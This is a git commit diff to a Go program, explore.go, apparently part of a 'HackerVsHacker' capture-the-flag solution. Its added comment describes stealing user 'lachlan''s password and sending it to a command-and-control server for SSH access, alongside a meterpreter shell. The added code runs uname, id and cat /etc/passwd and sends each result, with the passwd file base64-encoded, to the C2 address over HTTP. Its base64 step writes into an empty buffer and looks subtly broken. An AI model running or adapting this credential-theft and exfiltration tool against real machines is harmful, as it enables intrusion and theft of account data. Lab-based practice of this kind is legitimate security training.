54e31e8857b8a9435478b3d10a4b3bae8924a043
Thomas Osgood <thomasosgood@redacted.local>
2022-10-27 23:23:21 -0400

    Added more funtionality to explore.go. Added comment block to top of explore.go.

--- HackerVsHacker/explore.go
+++ HackerVsHacker/explore.go
@@ -1,6 +1,37 @@
+//============================================================
+//
+// To compile:
+//		go build explore.go
+//
+//============================================================
+//
+// This script is designed to seek out the user "lachlan"'s
+// password and send it back to a C2 server as a "GET" request.
+//
+// Once the user has posession of the password, they are able
+// to SSH into the target machine using the credentials
+// "lachlan:<password>".
+//
+// This can be used alongside the meterpreter shell spawned by
+// foothold.py or this can replace the msfvenom payload and
+// give the user "legitimate" access to the machine via SSH by
+// stealing the user credentials.
+//
+// This also attempts to read the contents of /etc/passwd,
+// base64 encode them, and pass them to the C2 server.
+//
+//============================================================
+//
+// Note:
+// If the GET requests to the C2 server fail, the program does
+// not exit; the message is displayed to the user and the
+// execution continues as normal.
+//
+//============================================================
 package main
 
 import (
+	"encoding/base64"
 	"flag"
 	"fmt"
 	"net/http"
@@ -97,6 +128,7 @@ func main() {
 	var c2address string
 	var target_ip string
 	var target_port int
+	var passwd_contents []byte
 
 	flag.StringVar(&target_ip, "i", "127.0.0.1", "ip address of C2 machine.")
 	flag.IntVar(&target_port, "p", 9999, "port to talk to C2 on.")
@@ -122,10 +154,53 @@ func main() {
 
 	InfoMsg(fmt.Sprintf("Password: %s", password))
 
-	success, message = TellPassword(c2address, fmt.Sprintf("password=%s", password))
+	success, message = TellPassword(c2address, fmt.Sprintf("user=lachlan&password=%s", password))
 	if !success {
 		ErrMsg(message)
 	}
+
+	output, err = exec.Command("uname", "-a").Output()
+	if err != nil {
+		ErrMsg(err.Error())
+		os.Exit(1)
+	}
+
+	str_output := strings.Replace(string(output), "\n", "", -1)
+
+	success, message = TellPassword(c2address, fmt.Sprintf("%s", str_output))
+	if !success {
+		ErrMsg(message)
+	}
+	InfoMsg(str_output)
+
+	output, err = exec.Command("id").Output()
+	if err != nil {
+		ErrMsg(err.Error())
+		os.Exit(1)
+	}
+
+	str_output = strings.Replace(string(output), "\n", "", -1)
+
+	success, message = TellPassword(c2address, fmt.Sprintf("id=%s", str_output))
+	if !success {
+		ErrMsg(message)
+	}
+	InfoMsg(str_output)
+
+	output, err = exec.Command("cat", "/etc/passwd").Output()
+	if err != nil {
+		ErrMsg(err.Error())
+		os.Exit(1)
+	}
+
+	base64.StdEncoding.Encode(passwd_contents, output)
+	str_output = string(passwd_contents)
+
+	success, message = TellPassword(c2address, fmt.Sprintf("passwd=%s", str_output))
+	if !success {
+		ErrMsg(message)
+	}
+	InfoMsg(string(output))
 
 	return
 }
